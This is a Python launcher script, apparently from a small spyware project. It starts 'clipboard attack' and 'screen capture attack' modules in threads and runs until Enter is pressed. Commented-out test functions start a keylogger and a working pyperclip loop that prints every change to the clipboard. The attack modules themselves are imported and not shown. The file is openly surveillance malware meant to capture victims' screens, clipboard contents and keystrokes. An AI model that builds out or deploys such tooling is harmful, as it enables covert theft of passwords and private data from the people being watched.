from config import _screen_capture, _clipboard_attack

from threading import Thread
from rich import print

# ! Tests
# def screen_capture():
#     th = Thread(target=_screen_capture.execute)

#     th.start()
#     print("[bold green]Screen capture attack started.")
#     print("[bold yellow]Press Enter to stop the attack.")
#     input()
#     _screen_capture.stop()

# def keylogger():
#     _keylogger.execute()
#     print("[bold green]Keylogger attack started.")
#     print("[bold yellow]Press Enter to stop the attack.")
#     input()
#     _keylogger.stop()


# def clipboard():
#     import pyperclip

#     try:
#         last_value = pyperclip.paste()
#         while True:
#             value = pyperclip.paste()
#             if value != last_value:
#                 print(f"[bold green]Clipboard value changed: {value}")
#                 last_value = value
#     except KeyboardInterrupt:
#         print("[bold red]Clipboard attack stopped.")
#         pass


# def clipboard():
#     th = Thread(target=_clipboard_attack.execute)
#     th.start()
#     print("[bold green]Clipboard attack started.")
#     print("[bold yellow]Press Enter to stop the attack.")
#     input()
#     _clipboard_attack.stop()


def main():
    clipboard_thread = Thread(target=_clipboard_attack.execute)
    screen_capture_thread = Thread(target=_screen_capture.execute)

    clipboard_thread.start()
    screen_capture_thread.start()

    print(f"[bold green]System started!")
    

    print("[bold yellow]Press Enter to stop the attacks.")
    input()
    _clipboard_attack.stop()
    _screen_capture.stop()

if __name__ == '__main__':
    main()